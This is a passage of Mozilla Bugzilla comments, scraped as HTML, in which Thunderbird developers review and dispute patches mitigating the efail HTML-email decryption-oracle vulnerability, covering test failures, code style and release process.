            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-104" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c104">Comment 104</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 05:18 PDT" data-time="1526559532">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-104">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-104" data-comment-id="13284153">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976351" name="attach_8976351" title="Sanitizer code cleanup, v2">attachment 8976351</a> <a href="/attachment.cgi?id=8976351&amp;action=edit" title="Sanitizer code cleanup, v2">[details]</a> <a href="/attachment.cgi?id=8976351&amp;action=diff" title="Sanitizer code cleanup, v2">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976351'>[review]</a>
Sanitizer code cleanup, v2

r- due to ...

Formal reasons:
- Patch doesn't apply to trunk.
- No commit message.

Factual reasons:
- Not a good a idea to change preference names at 52.8.x or 52.9.x.
  The preference in question is publicised on the web.
- Would be OK to change for TB 60, but only with migration code
  (which is easy to do).</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976351&amp;action=edit"
           title="Sanitizer code cleanup, v2"
           class=""
        >Attachment #8976351</a> -
        Flags: review-</div></div></div><div class="change-set" id="c105"><div class="comment" data-id="13284158" data-no="105"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-105" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-105"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-105" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c105">Comment 105</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 05:21 PDT" data-time="1526559703">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-105">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-105" data-comment-id="13284158">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976363" name="attach_8976363" title="Sanitize quotes, v4 (for 52)">attachment 8976363</a> <a href="/attachment.cgi?id=8976363&amp;action=edit" title="Sanitize quotes, v4 (for 52)">[details]</a> <a href="/attachment.cgi?id=8976363&amp;action=diff" title="Sanitize quotes, v4 (for 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976363'>[review]</a>
Sanitize quotes, v4 (for 52)

f- due to formal reasons:
- No commit message
- Mix of hunks for C-C and M-C
- Yes, it says &quot;for 52&quot;, but doesn't help us. We need to land on
  trunk first, make sure all the tests pass, then uplift after
  maybe a short ride on beta.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976363&amp;action=edit"
           title="Sanitize quotes, v4 (for 52)"
           class=""
        >Attachment #8976363</a> -
        Flags: feedback-</div></div></div><div class="change-set" id="c106"><div class="comment" data-id="13284165" data-no="106"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-106" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-106"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-106" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c106">Comment 106</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 05:26 PDT" data-time="1526559972">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-106">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-106" data-comment-id="13284165">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976349" name="attach_8976349" title="Separate MIME parts from each other, v4 (trunk and 52)">attachment 8976349</a> <a href="/attachment.cgi?id=8976349&amp;action=edit" title="Separate MIME parts from each other, v4 (trunk and 52)">[details]</a> <a href="/attachment.cgi?id=8976349&amp;action=diff" title="Separate MIME parts from each other, v4 (trunk and 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976349'>[review]</a>
Separate MIME parts from each other, v4 (trunk and 52)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976349" name="attach_8976349" title="Separate MIME parts from each other, v4 (trunk and 52)">attachment 8976349</a> <a href="/attachment.cgi?id=8976349&amp;action=edit" title="Separate MIME parts from each other, v4 (trunk and 52)">[details]</a> <a href="/attachment.cgi?id=8976349&amp;action=diff" title="Separate MIME parts from each other, v4 (trunk and 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976349'>[review]</a>:
-----------------------------------------------------------------

Repeating from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c98">comment #98</a>:
- This causes test failures.
- Not sure whether the new class completely replaces the old.
- Not sure where the horizontal lines come from. They would be OK if styled properly with margins/spacing.

::: mailnews/mime/src/mimei.cpp
&#64;&#64; -328,5 &#64;&#64;
<span class="quote">&gt;    return
&gt;       !(
&gt;          (avoid_html
&gt;           &amp;&amp; (
&gt; -              clazz == (MimeObjectClass *)&amp;mimeInlineTextHTMLClass</span >

Can the class whose usage you're removing be removed completely? If so, please do. If not, please explain in which cases which class is used.</pre></div><div class="change-set" id="c107"><div class="comment" data-id="13284660" data-no="107"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-107" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15265139_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-107"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-107" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c107">Comment 107</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 08:19 PDT" data-time="1526570379">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-107">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-107" data-comment-id="13284660">Can you <a href="mailto:invitehanno&#64;hboeck.de">invitehanno&#64;hboeck.de</a> to this bug?</pre></div><div class="change-set" id="c108"><div class="comment" data-id="13284775" data-no="108"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-108" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-108"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-108" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c108">Comment 108</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 08:49 PDT" data-time="1526572179">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-108">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-108" data-comment-id="13284775">Why? He's a journalist and asked why this is progressing so slowly in an e-mail to the Council. I don't see any reason to add him here. So far, this is confidential, so I woudn't add a representative of the press.</pre></div><div class="change-set" id="c109"><div class="comment" data-id="13284828" data-no="109"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-109" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15265139_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-109"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-109" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c109">Comment 109</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 09:09 PDT" data-time="1526573383">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-109">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-109" data-comment-id="13284828">He found a bypass for the current mitigation which may be interesting :)</pre></div><div class="change-set" id="c110"><div class="comment" data-id="13284880" data-no="110"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-110" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-110"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-110" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c110">Comment 110</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 09:20 PDT" data-time="1526574053">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-110">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-110" data-comment-id="13284880">Maybe he wants to file a new bug then. We're already at <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c110">comment #110</a> here and the bug is getting more and more confusing.

If he found a bypass for (which?) current mitigation, then it doesn't belong here since this mitigation here wasn't shipped yet. Or did he apply the patches, compiled and then found that the specific solution proposed in the patches here doesn't work. Only then we're interested in this bug, anything else needs to go elsewhere.</pre></div><div class="change-set" id="c111"><div class="comment" data-id="13285265" data-no="111"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-111" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-111"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-111" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c111">Comment 111</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 11:07 PDT" data-time="1526580465">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-111">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-111" data-comment-id="13285265"><span class="quote">&gt; - Not sure whether the new class completely replaces the old.</span >

Yes, it does. You can see 

- Not sure where the horizontal lines come from. They would be OK if styled properly with margins/spacing.

<span class="quote">&gt; &gt; For existing code, use the prevailing style in a file or module.
&gt; I don't have the time now to do a statistical analysis to see what's &quot;prevailing&quot;. As far as I can tell, MIME is a mess</span >

Simply open a random typical libmime file, like mimehdrs.cpp, mimethtm.cpp, mimeebod.cpp.
If I now start using a different style, as you ask me to, *that* would be a &quot;mess&quot;.

::: mailnews/mime/src/mimei.cpp
&#64;&#64; -328,5 &#64;&#64;
<span class="quote">&gt;          (avoid_html
&gt;           &amp;&amp; (
&gt; -              clazz == (MimeObjectClass *)&amp;mimeInlineTextHTMLClass</span >

<span class="quote">&gt; Can the class whose usage you're removing be removed completely?</span >

No, because it's the base class for this one here, and for the sanitizer.

Also, I would like to leave it in, in case we go back to straight pass-thought. I'll explain more to you in person why.

<span class="quote">&gt; He's a journalist and asked why this is progressing so slowly in an e-mail to the Council</span >

He's got a point...

<span class="quote">&gt; &gt; I'd be happy to discuss the merits of the patch with you on the phone, and
&gt; &gt; explain everything. As long as we agree to focus on securing end users.
&gt; I prefer to document this in writing here.</span >

I tried to reach you on the phone twice, but couldn't reach you.

This back and forth in async writing, and waiting for each answer for hours, takes too much time, both calendar time and my work time.

I'd like to get this finished. If we can work together on this, in realtime, we can get this done in a matter of 2-3 hours. We can't have this drag on like that. I neither have the time, nor can the users wait any longer. My offer to collaborate is there. You have my phone number.</pre></div><div class="change-set" id="c112"><div class="comment" data-id="13285269" data-no="112"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-112" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-112"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-112" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c112">Comment 112</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 11:09 PDT" data-time="1526580591">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-112">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-112" data-comment-id="13285269">Sorry, half finished comment:

<span class="quote">&gt; &gt; - Not sure whether the new class completely replaces the old.</span >

Yes, it does. You can see that in mimei.cpp. That's the switchboard class that decides which class implements what.

The only reference I left in is the &quot;avoid&quot; blacklist, and that's just a safety net.</pre></div><div class="change-set" id="c113"><div class="comment" data-id="13285518" data-no="113"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-113" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15265139_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-113"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-113" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c113">Comment 113</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 13:01 PDT" data-time="1526587315">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-113">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-113" data-comment-id="13285518">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976351" name="attach_8976351" title="Sanitizer code cleanup, v2">attachment 8976351</a> <a href="/attachment.cgi?id=8976351&amp;action=edit" title="Sanitizer code cleanup, v2">[details]</a> <a href="/attachment.cgi?id=8976351&amp;action=diff" title="Sanitizer code cleanup, v2">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976351'>[review]</a>
Sanitizer code cleanup, v2

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976351" name="attach_8976351" title="Sanitizer code cleanup, v2">attachment 8976351</a> <a href="/attachment.cgi?id=8976351&amp;action=edit" title="Sanitizer code cleanup, v2">[details]</a> <a href="/attachment.cgi?id=8976351&amp;action=diff" title="Sanitizer code cleanup, v2">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976351'>[review]</a>:
-----------------------------------------------------------------

I don't care much about the pref, but this (and other patches) need to apply to trunk. Yes we want to move as fast as possible, but patches need to land on trunk before elsewhere.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976351&amp;action=edit"
           title="Sanitizer code cleanup, v2"
           class=""
        >Attachment #8976351</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div></div></div><div class="change-set" id="c114"><div class="comment" data-id="13285523" data-no="114"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-114" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15265139_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-114"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-114" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c114">Comment 114</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 13:04 PDT" data-time="1526587477">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-114">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-114" data-comment-id="13285523">(In reply to Jens Müller from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c109">comment #109</a>)
<span class="quote">&gt; He found a bypass for the current mitigation which may be interesting :)</span >

Could you file a new bug where you expand on this? You can use &quot;Clone this bug&quot; link below.</pre><div class="activity"><div class="change">Flags: needinfo?(jens.a.mueller)</div></div></div><div class="change-set" id="c115"><div class="comment" data-id="13285578" data-no="115"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-115" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15265139_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-115"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-115" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c115">Comment 115</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 13:27 PDT" data-time="1526588854">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-115">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-115" data-comment-id="13285578">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976351" name="attach_8976351" title="Sanitizer code cleanup, v2">attachment 8976351</a> <a href="/attachment.cgi?id=8976351&amp;action=edit" title="Sanitizer code cleanup, v2">[details]</a> <a href="/attachment.cgi?id=8976351&amp;action=diff" title="Sanitizer code cleanup, v2">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976351'>[review]</a>
Sanitizer code cleanup, v2

Actually, maybe it doesn't make sens to allow css for this use case. People chose to view Plain HTML and have to live with that it's not pretty.</pre></div><div class="change-set" id="c116"><div class="comment" data-id="13285615" data-no="116"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-116" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-116"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-116" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c116">Comment 116</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 13:40 PDT" data-time="1526589655">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-116">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-116" data-comment-id="13285615">Ben, to get positive review of the &quot;Separate MIME parts from each other, v4 (trunk and 52)&quot; patch, can you please address the test failures. The horizontal lines without margins/spacing are another *real* issue aside from the style discussion.

Please document what you have to say about the technical issues here. It needs to be documented. Phone calls are not the normal form of developer communication in Mozilla. Typically an issue can be settled within a day if all participants are in the same time zone and reply a few times during the day.</pre></div><div class="change-set" id="c117"><div class="comment" data-id="13285636" data-no="117"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-117" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-117"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-117" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c117">Comment 117</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 13:50 PDT" data-time="1526590236">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-117">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-117" data-comment-id="13285636"><span class="quote">&gt; Please document what you have to say about the technical issues here</span >

Is there anything that you're missing in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment 57</a>, which gives the big overview?
And the comments when I attached the patches, e.g. <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c69">comment 69</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c73">comment 73</a> and <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c92">comment 92</a> and <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c97">comment 97</a>?

<span class="quote">&gt; The horizontal lines</span >

Honestly, I don't know where they come from, but they are not coming from my code.

<span class="quote">&gt; can you please address the test failures</span >

It's not surprising that they fail, given that we intentionally change the output here.
I don't have the test suite set up, and last time I tried, it cost me a whole day to get it running. Could you please help me out there adapting the tests? That would be much appreciated.</pre></div><div class="change-set" id="c118"><div class="comment" data-id="13285702" data-no="118"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-118" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-118"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-118" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c118">Comment 118</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:18 PDT" data-time="1526591899">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-118">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
